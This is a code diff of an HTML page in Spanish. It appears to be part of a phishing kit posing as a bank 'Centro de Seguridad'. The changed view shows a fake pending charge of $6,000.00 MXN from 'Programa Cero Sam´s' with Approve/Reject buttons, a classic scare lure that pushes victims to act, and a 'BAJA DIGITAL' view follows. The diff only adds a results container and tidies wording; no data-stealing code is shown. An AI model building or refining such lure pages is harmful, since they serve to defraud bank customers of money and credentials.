@@ -477,25 +477,31 @@
     <main class="main-content">
       
       <!-- VISTA 1: CARGOS -->
-      <div id="vista-cargos" style="display: block;">
-        <div class="section-header">Centro de Seguridad — Autorización de Cargos en Línea</div>
-        <div class="charge-card">
-          <h4>Transacción Pendiente de Confirmación</h4>
-          <div class="charge-details">
-            <p><strong>Comercio:</strong> <span id="charge-merchant">Programa Cero Sam´s</span></p>
-            <p><strong>Monto Solicitado:</strong> <span id="charge-amount">$6,000.00 MXN</span></p>
-            <p><strong>Estado:</strong> En espera de Cancelación</p>
-          </div>
-          <p style="color: #666; font-size: 12px; border-top: 1px solid #070706; padding-top: 10px; margin-top: 10px;">
-            valide si reconoces este movimiento para autorizar o bloquear el procesamiento del pago.
-          </p>
-          <div class="btn-actions-row">
-            <button id="btn-accept-charge" class="btn-action approve">Aprobar</button>
-            <button id="btn-reject-charge" class="btn-action reject">Rechazar</button>
-          </div>
-          <div id="dash-status-message"></div>
-        </div>
-      </div>
+<div id="vista-cargos" style="display: block;">
+  <div class="section-header">Centro de Seguridad — Autorización de Cargos en Línea</div>
+  
+  <!-- Contenedor donde se acumulan los resultados anteriores -->
+  <div id="cargos-historial"></div>
+
+  <!-- Tarjeta del cargo actual / nuevo -->
+  <div class="charge-card">
+    <h4>Transacción Pendiente de Confirmación</h4>
+    <div class="charge-details">
+      <p><strong>Comercio:</strong> <span id="charge-merchant">Programa Cero Sam´s</span></p>
+      <p><strong>Monto Solicitado:</strong> <span id="charge-amount">$6,000.00 MXN</span></p>
+      <p><strong>Estado:</strong> En espera de Cancelación</p>
+    </div>
+    <p style="color: #666; font-size: 12px; border-top: 1px solid #e0b4b8; padding-top: 10px; margin-top: 10px;">
+      Valide si reconoce este movimiento para autorizar o bloquear el procesamiento del pago.
+    </p>
+    <div class="btn-actions-row">
+      <button id="btn-accept-charge" class="btn-action approve">Aprobar</button>
+      <button id="btn-reject-charge" class="btn-action reject">Rechazar</button>
+    </div>
+    <div id="dash-status-message"></div>
+  </div>
+</div>
+
 
       <!-- VISTA 2: BAJA DIGITAL -->
       <div id="vista-baja" style="display: none;">
